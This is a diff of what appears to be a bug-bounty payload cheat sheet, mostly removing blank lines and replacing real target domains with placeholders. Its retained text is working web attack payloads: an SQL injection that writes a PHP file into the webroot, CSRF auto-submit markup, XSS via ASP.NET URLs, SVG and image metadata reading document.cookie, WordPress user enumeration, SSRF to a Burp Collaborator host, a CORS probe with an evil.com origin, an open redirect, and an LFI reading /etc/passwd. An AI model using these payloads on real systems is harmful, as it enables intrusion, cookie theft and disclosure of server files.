@@ -150,11 +150,6 @@ id=ddos) union select 1,2,3,4,5,6,7,'<? phpinfo(); ?>’ into outfile ‘/var/ww
 id=ddos) into outfile ‘/var/www/html/bWAPP/image/phpinfo’ fields terminated by ‘<? phpinfo(); ?>’%23
 
 
-
-
-
-
-
 CSRF doc
 
 <body onload="document.getElementById('form').submit()">
@@ -167,7 +162,6 @@ CSRF doc
 ASP NET xss
 
 https://target.com/(Z(%22onerror=%22alert`1`%22))/Default.aspx
-
 https://target.com/(Z("><img src%22onerror=%22alert`1`%22))/Default.aspx
 
 
@@ -224,36 +218,28 @@ CLICKJACKING
 
 
 WORDPRESS
-
 USERS: https://www.target.com/wp-json/wp/v2/users
 
 LOGIN: 
 https://target.com/wp-login.php
 https://target.com/wp-admin
 
-
 SSRF 
 https://www.target.com/wp-json/oembed/1.0/proxy?url=rb69x7rtgks0sf1gvswqj0jh48azyo.burpcollaborator.net
-
 
 DEFAULT PAGE FOUND
 https://www.target.com/readme.html
 https://www.target.com/license.txt
 
-
 INFORMATION DISCLOSURE 
 https://www.target.com/feed/
-
-
 
 SVG 
 <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
  width="2560.000000pt" height="1600.000000pt" viewBox="0 0 2560.000000 1600.000000"
  preserveAspectRatio="xMidYMid meet" onload="alert(document.cookie)">
 
-
 exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comment_exif_metadata_double_quote.png
-
 
 File Name Vulnerability:
 Path Traversals: ../../../tmp/lol.png
@@ -277,7 +263,6 @@ Svg file content:
 3rd Injection:*/(document/*xx
 4th Injection: */prompt/*xxxxx
 5th Injection: "><script>/*xss
-
 
 
 XML upload XSS
@@ -342,7 +327,7 @@ Referer: http://attack$target$.com/ ==> 200 Ok. //Report it ryt now (“:
 -------------------------
 
 CORS 
-curl https://api.artsy.net -H “Origin: https://evil.com” -I
+curl https://tes.net -H “Origin: https://evil.com” -I
 
 
 Access-Control-Allow-Credentials: true
@@ -386,7 +371,7 @@ https://subdomain.site.com/fetch?token=1&url=http://scanme.nmap.org::22
 https://subdomain.site.com/fetch?token=1&url=http://scanme.nmap.org::111
 ------------------
 openredirect 
-https://en.datocapital.com/isn/Login?u=https%3A%2F%2Fwww.google.com.pk%2F
+https://test.com/isn/Login?u=https%3A%2F%2Fwww.google.com.pk%2F
 ------------------
 
 SSRF
@@ -411,7 +396,7 @@ ping 127.127.127.127.nip.io
 
 
 LFI 
-https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:4848/theme/META-INF%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2fetc%2fpasswd
+https://tst.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:4848/theme/META-INF%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2fetc%2fpasswd
 
 
 
